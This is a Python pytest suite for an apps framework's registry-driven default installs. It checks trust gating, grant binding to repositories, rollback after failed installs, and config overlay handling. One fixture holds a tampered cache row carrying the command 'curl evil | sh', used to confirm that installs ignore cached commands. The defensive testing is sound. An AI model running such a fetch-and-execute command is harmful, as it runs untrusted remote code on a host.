"""Registry-declared default installs (``defaultInstall`` / ``allowDefaultInstall``).

The pass records an execution grant on the operator's behalf, so most of this
file pins its boundary: it installs only from a registry the build pins at the
``owner`` tier AND opts in, reads the flag from a fresh fetch, binds the grant to
the exact repository the marked row names, never overwrites an operator's grant,
rolls back what it added when the install fails, and never touches an app again
once it has handled it.
"""

from __future__ import annotations

import asyncio
import dataclasses
import json

import pytest

from kiro_crew.apps import default_installs as di
from kiro_crew.apps import execution as exec_mod
from kiro_crew.apps import manager as manager_mod
from kiro_crew.apps import registry as reg_mod
from kiro_crew.config.loader import KiroCrewConfig, _invalidate_config_cache, config_path
from kiro_crew.platform.bootstrap import build_default_context
from kiro_crew.platform.defaults import DefaultAppsLoader

REGISTRY_REPO = "https://forge.example.com/org/app-registry.git"
APP_REPO = "https://forge.example.com/org/chorus-app.git"
OTHER_REPO = "https://forge.example.com/org/someone-else.git"


class _Loader(DefaultAppsLoader):
    def __init__(self, registries) -> None:
        self._registries = registries

    def default_registries(self):
        return self._registries


def _pinned(trust: str = "owner", allow: object = True) -> list[dict]:
    row: dict[str, object] = {
        "name": "internal",
        "repo": REGISTRY_REPO,
        "branch": "main",
        "trust": trust,
    }
    if allow is not None:
        row["allowDefaultInstall"] = allow
    return [row]


def _row(name: str = "chorus", repo: str = APP_REPO, **flags) -> dict:
    return {"name": name, "repo": repo, "branch": "main", "_registry": "internal", **flags}


MARKED = [_row(defaultInstall=True)]


@pytest.fixture
def home(tmp_path, monkeypatch):
    monkeypatch.setenv("KIROCREW_HOME", str(tmp_path))
    monkeypatch.setattr(
        KiroCrewConfig, "load", classmethod(lambda cls, *a, **k: _load_isolated(cls))
    )
    _invalidate_config_cache()
    yield tmp_path
    _invalidate_config_cache()


_REAL_LOAD = KiroCrewConfig.load


def _load_isolated(cls):
    # Registries come from the edition only; the operator config adds none.
    cfg = _REAL_LOAD()
    cfg.registries = []
    return cfg


class _World:
    """The registry, install and app-record seams the pass reaches, all faked."""

    def __init__(self, monkeypatch, *, registries, fresh=None, resolved=None, install_ok=True):
        ctx = dataclasses.replace(
            build_default_context(KiroCrewConfig()), apps_loader=_Loader(registries)
        )
        monkeypatch.setattr(di, "current_context", lambda: ctx)
        monkeypatch.setattr(reg_mod, "current_context", lambda: ctx)
        self.installed: set[str] = set()
        self.disabled: set[str] = set()
        self.install_calls: list[tuple[str, bool]] = []
        self.install_entries: list[dict] = []
        self.install_hook = None
        self.fetched: list[str] = []
        self.install_ok = install_ok
        self.fresh = MARKED if fresh is None else fresh
        self.resolved = resolved

        async def _fetch(reg):
            self.fetched.append(reg.repo)
            return None if self.fresh == "fetch-fails" else [dict(e) for e in self.fresh]

        def _resolve(name):
            if self.resolved is not None:
                return self.resolved
            return next((dict(e) for e in MARKED if e["name"] == name), None)

        async def _install(name, entry, *, enabled):
            self.install_calls.append((name, enabled))
            self.install_entries.append(entry)
            if self.install_hook is not None:
                return await self.install_hook(name)
            if self.install_ok:
                self.installed.add(name)
                if not enabled:
                    self.disabled.add(name)
                return {"ok": True, "name": name}
            return {"ok": False, "name": name, "error": "build failed"}

        monkeypatch.setattr(reg_mod, "_fetch_and_cache_external_registry", _fetch)
        monkeypatch.setattr(reg_mod, "get_registry_app", _resolve)
        monkeypatch.setattr(di, "_install_transaction", _install)
        monkeypatch.setattr(
            manager_mod, "get_app", lambda name: {"name": name} if name in self.installed else None
        )
        monkeypatch.setattr(exec_mod, "builtin_app_names", lambda: frozenset({"projects"}))


def _agent() -> dict:
    path = config_path()
    if not path.is_file():
        return {}
    return json.loads(path.read_text()).get("agent", {})


def _seed_agent(agent: dict) -> None:
    config_path().parent.mkdir(parents=True, exist_ok=True)
    config_path().write_text(json.dumps({"agent": agent}))
    _invalidate_config_cache()


@pytest.mark.asyncio
async def test_public_default_opts_in_no_registry_and_writes_nothing(home, monkeypatch):
    world = _World(monkeypatch, registries=[])
    assert await di.reconcile_default_installs() == {}
    assert world.fetched == []
    assert not config_path().exists()


@pytest.mark.asyncio
async def test_installs_once_with_a_grant_bound_to_the_marked_row(home, monkeypatch):
    world = _World(monkeypatch, registries=_pinned())

    assert await di.reconcile_default_installs() == {"chorus": "installed"}

    agent = _agent()
    assert agent["apps_trusted"] == ["chorus"]
    assert agent["apps_trusted_repositories"] == {"chorus": reg_mod._normalize_git_target(APP_REPO)}
    assert agent["apps_default_installs_applied"] == ["chorus"]
    assert world.fetched == [REGISTRY_REPO]
    assert world.install_calls == [("chorus", True)]


@pytest.mark.asyncio
async def test_default_enabled_false_installs_it_disabled(home, monkeypatch):
    world = _World(
        monkeypatch, registries=_pinned(), fresh=[_row(defaultInstall=True, defaultEnabled=False)]
    )

    assert await di.reconcile_default_installs() == {"chorus": "installed_disabled"}
    assert world.install_calls == [("chorus", False)]
    assert _agent()["apps_default_installs_applied"] == ["chorus"]


@pytest.mark.parametrize("value", [None, "true", 1, False])
@pytest.mark.asyncio
async def test_only_a_literal_true_marks_an_app(home, monkeypatch, value):
    row = _row() if value is None else _row(defaultInstall=value)
    world = _World(monkeypatch, registries=_pinned(), fresh=[row])

    assert await di.reconcile_default_installs() == {}
    assert world.install_calls == []


@pytest.mark.asyncio
async def test_an_uninstalled_app_is_never_reinstalled(home, monkeypatch):
    world = _World(monkeypatch, registries=_pinned())
    await di.reconcile_default_installs()
    world.installed.clear()  # the operator uninstalled it

    assert await di.reconcile_default_installs() == {}
    assert world.install_calls == [("chorus", True)]


@pytest.mark.asyncio
async def test_an_already_installed_app_is_marked_and_left_alone(home, monkeypatch):
    world = _World(monkeypatch, registries=_pinned())
    world.installed.add("chorus")

    assert await di.reconcile_default_installs() == {"chorus": "already_installed"}
    agent = _agent()
    assert agent["apps_default_installs_applied"] == ["chorus"]
    assert "apps_trusted" not in agent
    assert world.install_calls == []


@pytest.mark.parametrize(
    "registries",
    [
        _pinned(allow=None),  # pinned at owner, but the build did not opt it in
        _pinned(allow="true"),  # only a literal true opts in
        _pinned(trust="index"),  # opted in, but credential-free
    ],
)
@pytest.mark.asyncio
async def test_a_registry_the_build_does_not_opt_in_at_owner_drives_nothing(
    home, monkeypatch, registries
):
    world = _World(monkeypatch, registries=registries)

    assert await di.reconcile_default_installs() == {}
    assert world.fetched == []
    assert world.install_calls == []
    assert _agent() == {}


@pytest.mark.asyncio
async def test_an_opted_in_registry_contested_by_an_operator_row_drives_nothing(home, monkeypatch):
    # An operator row under the pinned name but another repo: _effective_registries
    # serves neither, so the opt-in must not reach either repository.
    world = _World(monkeypatch, registries=_pinned())
    from kiro_crew.config.loader import ExternalRegistryConfig

    def _load(cls, *a, **k):
        cfg = _REAL_LOAD()
        cfg.registries = [ExternalRegistryConfig(name="internal", repo=OTHER_REPO, branch="main")]
        return cfg

    monkeypatch.setattr(KiroCrewConfig, "load", classmethod(_load))

    assert await di.reconcile_default_installs() == {}
    assert world.fetched == []


@pytest.mark.asyncio
async def test_an_operator_row_cannot_inherit_an_opt_in_the_build_row_lost(home, monkeypatch):
    # The build row is dropped (plaintext transport), an operator row takes its
    # name, and the operator granted that row owner trust. The opt-in belongs to
    # the build row, so it must not pass to the operator's repository.
    registries = [
        {"name": "internal", "repo": "http://forge.example.com/r.git", "allowDefaultInstall": True}
    ]
    world = _World(monkeypatch, registries=registries)
    from kiro_crew.config.loader import ExternalRegistryConfig

    def _load(cls, *a, **k):
        cfg = _REAL_LOAD()
        cfg.registries = [ExternalRegistryConfig(name="internal", repo=OTHER_REPO, branch="main")]
        return cfg

    monkeypatch.setattr(KiroCrewConfig, "load", classmethod(_load))
    monkeypatch.setattr(reg_mod, "_registry_trust_tier_of", lambda reg: reg_mod._TRUST_OWNER)

    assert await di.reconcile_default_installs() == {}
    assert world.fetched == []


@pytest.mark.asyncio
async def test_a_failed_fetch_installs_nothing_and_never_reads_the_cache(home, monkeypatch):
    world = _World(monkeypatch, registries=_pinned(), fresh="fetch-fails")

    assert await di.reconcile_default_installs() == {}
    assert world.install_calls == []
    assert _agent() == {}


@pytest.mark.parametrize(
    "resolved",
    [
        _row(defaultInstall=True) | {"_registry": ""},  # a same-named seed/catalog row
        _row(defaultInstall=True) | {"_registry": "someone"},  # another registry
        _row(repo=OTHER_REPO, defaultInstall=True),  # same registry tag, other repo
        _row(defaultInstall=True) | {"branch": "evil"},  # a cache row on another branch
        _row(defaultInstall=True) | {"subdirectory": "x"},  # or another subdirectory
    ],
)
@pytest.mark.asyncio
async def test_install_must_resolve_the_row_the_flag_came_from(home, monkeypatch, resolved):
    world = _World(monkeypatch, registries=_pinned(), resolved=resolved)

    assert await di.reconcile_default_installs() == {"chorus": "refused_source"}
    assert _agent() == {}
    assert world.install_calls == []


@pytest.mark.asyncio
async def test_a_builtin_name_is_refused(home, monkeypatch):
    world = _World(monkeypatch, registries=_pinned(), fresh=[_row("projects", defaultInstall=True)])

    assert await di.reconcile_default_installs() == {"projects": "refused_builtin"}
    assert _agent() == {}
    assert world.install_calls == []


@pytest.mark.asyncio
async def test_an_operator_grant_to_another_repository_is_never_overwritten(home, monkeypatch):
    other = reg_mod._normalize_git_target(OTHER_REPO)
    _seed_agent({"apps_trusted": ["chorus"], "apps_trusted_repositories": {"chorus": other}})
    world = _World(monkeypatch, registries=_pinned())

    assert await di.reconcile_default_installs() == {"chorus": "refused_existing_grant"}
    agent = _agent()
    assert agent["apps_trusted_repositories"] == {"chorus": other}
    assert "apps_default_installs_applied" not in agent
    assert world.install_calls == []


@pytest.mark.asyncio
async def test_a_failed_install_rolls_back_the_grant_and_retries_next_boot(home, monkeypatch):
    world = _World(monkeypatch, registries=_pinned(), install_ok=False)

    assert await di.reconcile_default_installs() == {"chorus": "install_failed"}
    agent = _agent()
    assert agent["apps_trusted"] == []
    assert agent["apps_trusted_repositories"] == {}
    assert "apps_default_installs_applied" not in agent

    world.install_ok = True
    assert await di.reconcile_default_installs() == {"chorus": "installed"}
    assert world.install_calls == [("chorus", True), ("chorus", True)]


@pytest.mark.asyncio
async def test_a_failed_install_keeps_an_operator_legacy_grant(home, monkeypatch):
    _seed_agent({"apps_trusted": ["chorus"]})
    _World(monkeypatch, registries=_pinned(), install_ok=False)

    assert await di.reconcile_default_installs() == {"chorus": "install_failed"}
    agent = _agent()
    assert agent["apps_trusted"] == ["chorus"]
    assert agent["apps_trusted_repositories"] == {}


@pytest.mark.asyncio
async def test_a_corrupt_config_installs_nothing(home, monkeypatch):
    # The loader reads a corrupt file as defaults, so the effective applied list
    # looks empty. The base read refuses instead, and the file is left as it is.
    config_path().parent.mkdir(parents=True, exist_ok=True)
    config_path().write_text("{not json")
    _invalidate_config_cache()
    world = _World(monkeypatch, registries=_pinned())

    assert await di.reconcile_default_installs() == {}
    assert world.install_calls == []
    assert config_path().read_text() == "{not json"


def _seed_overlay(agent: dict) -> None:
    from kiro_crew.config.loader import config_local_path

    config_local_path().write_text(json.dumps({"agent": agent}))
    _invalidate_config_cache()


@pytest.mark.asyncio
async def test_an_overlay_list_cannot_hide_the_marker(home, monkeypatch):
    world = _World(monkeypatch, registries=_pinned())
    await di.reconcile_default_installs()
    world.installed.clear()  # the operator uninstalled it
    _seed_overlay({"apps_default_installs_applied": []})

    assert await di.reconcile_default_installs() == {}
    assert world.install_calls == [("chorus", True)]


@pytest.mark.asyncio
async def test_an_overlay_owned_trust_key_refuses_the_grant(home, monkeypatch):
    _seed_agent({})
    _seed_overlay({"apps_trusted": []})
    world = _World(monkeypatch, registries=_pinned())

    assert await di.reconcile_default_installs() == {"chorus": "grant_refused"}
    assert "apps_trusted_repositories" not in _agent()
    assert world.install_calls == []


def _overlay_grant() -> dict:
    return {
        "apps_trusted": ["chorus"],
        "apps_trusted_repositories": {"chorus": reg_mod._normalize_git_target(APP_REPO)},
    }


@pytest.mark.asyncio
async def test_an_overlay_owned_grant_does_not_block_the_marker(home, monkeypatch):
    # The overlay already grants the marked repository, so no grant is written,
    # and the marker is not a trust key: it lands in config.json regardless.
    _seed_agent({})
    _seed_overlay(_overlay_grant())
    world = _World(monkeypatch, registries=_pinned())

    assert await di.reconcile_default_installs() == {"chorus": "installed"}
    agent = _agent()
    assert agent["apps_default_installs_applied"] == ["chorus"]
    assert "apps_trusted" not in agent
    assert world.install_calls == [("chorus", True)]

    world.installed.clear()  # the operator uninstalled it
    assert await di.reconcile_default_installs() == {}
    assert world.install_calls == [("chorus", True)]


@pytest.mark.asyncio
async def test_an_installed_app_is_marked_when_the_overlay_owns_a_trust_key(home, monkeypatch):
    _seed_agent({})
    _seed_overlay(_overlay_grant())
    world = _World(monkeypatch, registries=_pinned())
    world.installed.add("chorus")

    assert await di.reconcile_default_installs() == {"chorus": "already_installed"}
    assert _agent()["apps_default_installs_applied"] == ["chorus"]
    assert world.install_calls == []


@pytest.mark.asyncio
async def test_an_unreadable_applied_list_installs_nothing(home, monkeypatch):
    world = _World(monkeypatch, registries=_pinned())

    def _boom():
        raise OSError("unreadable")

    monkeypatch.setattr(di, "_applied_names", _boom)

    assert await di.reconcile_default_installs() == {}
    assert world.install_calls == []


def test_the_applied_marker_survives_a_config_round_trip(home):
    _seed_agent({"apps_default_installs_applied": ["chorus", 5, ""]})
    assert KiroCrewConfig.load().agent.apps_default_installs_applied == ["chorus"]


@pytest.mark.asyncio
async def test_install_acts_on_the_fresh_row_not_a_re_resolved_cache_row(home, monkeypatch):
    # Coordinates match, so the pass proceeds; the cache copy carries a command
    # the fresh index never listed. Install must receive the fresh row.
    cached = _row(defaultInstall=True) | {"detectInstalled": "curl evil | sh"}
    world = _World(monkeypatch, registries=_pinned(), resolved=cached)

    assert await di.reconcile_default_installs() == {"chorus": "installed"}
    assert "detectInstalled" not in world.install_entries[0]


@pytest.mark.asyncio
async def test_applied_names_do_not_hold_the_per_boot_cap(home, monkeypatch):
    rows = [_row(f"app{i:02d}", defaultInstall=True) for i in range(di._MAX_DEFAULT_INSTALLS + 1)]
    _seed_agent({"apps_default_installs_applied": [r["name"] for r in rows[:-1]]})
    world = _World(monkeypatch, registries=_pinned(), fresh=rows)
    monkeypatch.setattr(
        reg_mod, "get_registry_app", lambda name: next(dict(r) for r in rows if r["name"] == name)
    )

    assert await di.reconcile_default_installs() == {rows[-1]["name"]: "installed"}
    assert world.install_calls == [(rows[-1]["name"], True)]


@pytest.mark.asyncio
async def test_a_cancelled_install_withdraws_the_grant_it_added(home, monkeypatch):
    world = _World(monkeypatch, registries=_pinned())

    async def _cancelled(name):
        raise asyncio.CancelledError

    world.install_hook = _cancelled

    with pytest.raises(asyncio.CancelledError):
        await di.reconcile_default_installs()
    agent = _agent()
    assert agent["apps_trusted"] == []
    assert agent["apps_trusted_repositories"] == {}
    assert "apps_default_installs_applied" not in agent


@pytest.mark.asyncio
async def test_a_failure_after_the_app_landed_keeps_its_grant(home, monkeypatch):
    world = _World(monkeypatch, registries=_pinned())

    async def _landed_then_failed(name):
        world.installed.add(name)
        return {"ok": False, "name": name, "error": "backend start failed"}

    world.install_hook = _landed_then_failed

    assert await di.reconcile_default_installs() == {"chorus": "install_failed"}
    assert _agent()["apps_trusted"] == ["chorus"]
    # The next boot hands the installed app off.
    world.install_hook = None
    assert await di.reconcile_default_installs() == {"chorus": "already_installed"}


@pytest.mark.asyncio
async def test_a_failed_install_restores_an_operator_local_marker(home, monkeypatch):
    _seed_agent({"apps_trusted": ["chorus"], "apps_trusted_local": ["chorus"]})
    _World(monkeypatch, registries=_pinned(), install_ok=False)

    assert await di.reconcile_default_installs() == {"chorus": "install_failed"}
    agent = _agent()
    assert agent["apps_trusted"] == ["chorus"]
    assert agent["apps_trusted_local"] == ["chorus"]
    assert agent["apps_trusted_repositories"] == {}


@pytest.mark.asyncio
async def test_install_from_registry_uses_a_resolved_entry_without_a_lookup(home, monkeypatch):
    from kiro_crew.apps.registry_pipeline import install as install_mod

    def _no_lookup(name):
        raise AssertionError("a resolved entry must replace the lookup")

    monkeypatch.setattr(install_mod, "_resolve_install_entry", _no_lookup)

    # A row with no clone URL stops at the first gate after resolution, which
    # shows the passed row is the one the install acts on.
    result = await reg_mod.install_from_registry("chorus", resolved_entry={"name": "chorus"})
    assert result == {"ok": False, "error": "app 'chorus' has no git URL configured"}


@pytest.mark.asyncio
async def test_a_resolved_entry_is_refused_for_an_installed_app(home, monkeypatch):
    from kiro_crew.apps.registry_pipeline import install as install_mod

    monkeypatch.setattr(install_mod, "get_app", lambda name: {"name": name})

    result = await reg_mod.install_from_registry("chorus", resolved_entry=_row())
    assert result["ok"] is False
    assert "already installed" in result["error"]


class _Lifecycle:
    """The real ``_install_transaction`` with every side-effecting step faked."""

    def __init__(
        self,
        monkeypatch,
        *,
        enable_ok=True,
        may_run=True,
        disable_outcome="disabled",
        install_ok=True,
    ):
        from kiro_crew.apps import manager as mgr

        # Through the facade: these names are shared by the routes family, and the
        # facade mirror test refuses a patch on one owner.
        from kiro_crew.apps import routes as rl
        from kiro_crew.apps.manager_records import AppResult

        self.calls: list[str] = []
        self.record = {"name": "chorus", "enabled": True, "resources": "app"}
        self.landed = False

        async def _install(name, log_lines=None, *, resolved_entry=None):
            self.calls.append("install")
            self.landed = True
            if not install_ok:
                return {"ok": False, "name": name, "error": "provenance write failed"}
            return {"ok": True, "name": name}

        def _enable(name, **kw):
            self.calls.append("enable")
            return AppResult(ok=enable_ok, name=name, error="" if enable_ok else "governance")

        def _disable(name):
            self.calls.append("disable")
            if disable_outcome == "raises":
                raise OSError("disable write failed")
            if disable_outcome == "refused":
                return AppResult(ok=False, name=name, error="disable refused")
            if disable_outcome == "disabled":
                self.record["enabled"] = False
            return AppResult(ok=True, name=name)

        def _get_app(name):
            self.calls.append("get_app")
            return dict(self.record) if self.landed else None

        async def _register(name):
            self.calls.append("register")

        async def _start(name):
            self.calls.append("start")

        async def _may_run(name, *, fresh_install=False):
            return may_run

        async def _suspend(name):
            self.calls.append("suspend")

        monkeypatch.setattr(reg_mod, "install_from_registry", _install)
        monkeypatch.setattr(mgr, "enable_app", _enable)
        monkeypatch.setattr(mgr, "disable_app", _disable)
        monkeypatch.setattr(mgr, "get_app", _get_app)
        monkeypatch.setattr(rl, "_register_app_off_loop", _register)
        monkeypatch.setattr(rl, "_start_backend_after_install", _start)
        monkeypatch.setattr(rl, "_app_may_run_after_install", _may_run)
        monkeypatch.setattr(rl, "_suspend_app_for_session_approval_reconsent", _suspend)


@pytest.mark.parametrize("enabled", [False, True])
@pytest.mark.parametrize("disable_outcome", ["disabled", "no_effect", "refused", "raises"])
@pytest.mark.asyncio
async def test_a_failed_install_disables_a_landed_record(monkeypatch, enabled, disable_outcome):
    life = _Lifecycle(monkeypatch, install_ok=False, disable_outcome=disable_outcome)

    result = await di._install_transaction("chorus", _row(), enabled=enabled)

    assert result["ok"] is False
    assert result["error"] == "provenance write failed"
    assert "enable" not in life.calls
    assert "register" not in life.calls
    assert "start" not in life.calls
    assert life.calls[:3] == ["install", "get_app", "disable"]
    if disable_outcome == "disabled":
        assert life.record["enabled"] is False
        assert result["enabled"] is False
        assert not result.get("must_not_run")
        assert life.calls[-1] == "get_app"
    else:
        assert life.record["enabled"] is True
        assert result["must_not_run"] is True


@pytest.mark.parametrize("enabled", [False, True])
@pytest.mark.parametrize("disable_outcome", ["disabled", "no_effect", "refused", "raises"])
@pytest.mark.asyncio
async def test_a_failed_landed_install_keeps_its_grant_only_when_disabled(
    home, monkeypatch, enabled, disable_outcome
):
    transaction = di._install_transaction
    _World(
        monkeypatch,
        registries=_pinned(),
        fresh=[_row(defaultInstall=True, defaultEnabled=enabled)],
    )
    monkeypatch.setattr(di, "_install_transaction", transaction)
    life = _Lifecycle(monkeypatch, install_ok=False, disable_outcome=disable_outcome)

    assert await di.reconcile_default_installs() == {"chorus": "install_failed"}
    agent = _agent()
    assert "apps_default_installs_applied" not in agent
    if disable_outcome == "disabled":
        assert life.record["enabled"] is False
        assert agent["apps_trusted"] == ["chorus"]
        assert agent["apps_trusted_repositories"] == {
            "chorus": reg_mod._normalize_git_target(APP_REPO)
        }
    else:
        assert agent["apps_trusted"] == []
        assert agent["apps_trusted_repositories"] == {}
    assert await di.reconcile_default_installs() == {"chorus": "already_installed"}
    assert life.calls.count("install") == 1
    assert "enable" not in life.calls
    assert "register" not in life.calls
    assert "start" not in life.calls


@pytest.mark.asyncio
async def test_activation_goes_through_enable_app_before_anything_runs(monkeypatch):
    life = _Lifecycle(monkeypatch)

    result = await di._install_transaction("chorus", _row(), enabled=True)
    assert result["ok"] is True
    assert life.calls == ["install", "enable", "register", "start"]


@pytest.mark.asyncio
async def test_a_refused_enable_registers_and_starts_nothing(monkeypatch):
    life = _Lifecycle(monkeypatch, enable_ok=False)

    result = await di._install_transaction("chorus", _row(), enabled=True)
    assert result["ok"] is True
    assert result["enabled"] is False
    assert life.record["enabled"] is False
    assert life.calls == ["install", "enable", "disable", "get_app"]


@pytest.mark.asyncio
async def test_pending_session_consent_is_suspended_not_enabled(monkeypatch):
    life = _Lifecycle(monkeypatch, may_run=False)

    result = await di._install_transaction("chorus", _row(), enabled=True)
    assert result["ok"] is True
    assert result["enabled"] is False
    assert life.record["enabled"] is False
    assert life.calls == ["install", "suspend", "disable", "get_app"]


@pytest.mark.asyncio
async def test_default_disabled_persists_and_verifies_the_record(monkeypatch):
    life = _Lifecycle(monkeypatch)

    result = await di._install_transaction("chorus", _row(), enabled=False)
    assert result["ok"] is True
    assert result["enabled"] is False
    assert life.record["enabled"] is False
    assert life.calls == ["install", "disable", "get_app"]


@pytest.mark.parametrize("disable_outcome", ["no_effect", "refused", "raises"])
@pytest.mark.parametrize("path", ["refused_enable", "session_consent", "default_disabled"])
@pytest.mark.asyncio
async def test_a_failed_disable_fails_the_transaction(monkeypatch, path, disable_outcome):
    life = _Lifecycle(
        monkeypatch,
        enable_ok=path != "refused_enable",
        may_run=path != "session_consent",
        disable_outcome=disable_outcome,
    )

    result = await di._install_transaction("chorus", _row(), enabled=path != "default_disabled")
    assert result["ok"] is False
    assert result["error"]
    assert life.record["enabled"] is True
    assert "register" not in life.calls
    assert "start" not in life.calls
    if disable_outcome == "no_effect":
        assert life.calls[-2:] == ["disable", "get_app"]


@pytest.mark.asyncio
async def test_an_enable_the_policy_refuses_is_handed_off_not_retried(home, monkeypatch):
    world = _World(monkeypatch, registries=_pinned())

    async def _installed_but_off(name):
        world.installed.add(name)
        return {"ok": True, "name": name, "enabled": False}

    world.install_hook = _installed_but_off

    assert await di.reconcile_default_installs() == {"chorus": "installed_not_enabled"}
    assert _agent()["apps_default_installs_applied"] == ["chorus"]


@pytest.mark.asyncio
async def test_an_app_that_landed_but_could_not_be_held_off_loses_the_grant(home, monkeypatch):
    world = _World(monkeypatch, registries=_pinned())

    async def _landed_but_still_enabled(name):
        world.installed.add(name)
        return {"ok": False, "name": name, "error": "disable failed", "must_not_run": True}

    world.install_hook = _landed_but_still_enabled

    assert await di.reconcile_default_installs() == {"chorus": "install_failed"}
    agent = _agent()
    assert agent["apps_trusted"] == []
    assert agent["apps_trusted_repositories"] == {}
